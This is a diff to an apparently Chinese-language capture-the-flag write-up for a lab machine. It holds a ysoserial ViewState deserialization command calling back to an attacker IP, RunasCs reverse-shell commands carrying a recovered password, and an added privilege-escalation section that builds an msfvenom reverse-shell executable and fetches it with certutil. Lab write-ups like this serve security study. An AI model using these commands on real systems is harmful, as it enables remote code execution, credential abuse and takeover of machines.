@@ -541,6 +541,8 @@ PORT   STATE SERVICE
 ```bash
 .\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.26:4444/$env:UserName" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
 ```
+
+
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240309213933.png)
 成功收到请求
 然后弹个shell回来
@@ -574,9 +576,23 @@ echo $Credential.GetNetworkCredential().password
 使用powershell解密得到密码`f8gQ8fynP44ek1m3`
 使用runascs可以绕过uac
 
-`.\RunasCs.exe alaading alaading_pass cmd.exe -r 10.10.16.26:3333`
+`.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.16.26:3333`
 
 5f4904d57c58149a29d31ca4d073387c
+
+#### root
+横向后需要提权,给alaading用户上传俩个文件
+制作一个反弹shell的木马和Runascs.exe上传过去
+` msfvenom -p windows/x64/shell_reverse_tcp LHOST=Your_IP LPORT=5959 -f exe -o pov.exe`
+
+```bash
+certutil -urlcache -f http://10.10.16.26:8000/RunasCs.exe RunasCs.exe
+certutil -urlcache -f http://10.10.16.26:8000/pov.exe pov.exe
+```
+
+开一个msfconsole,在multi/handler模块,使用`set payload window/x64/meterpreter/reverse_tcp`模块
+
+`.\RunasCs.exe alaading f8gQ8fynP44ek1m3 "C:\\Users\\alaading\\pov.exe"`
 
 ### Manager
 #### user
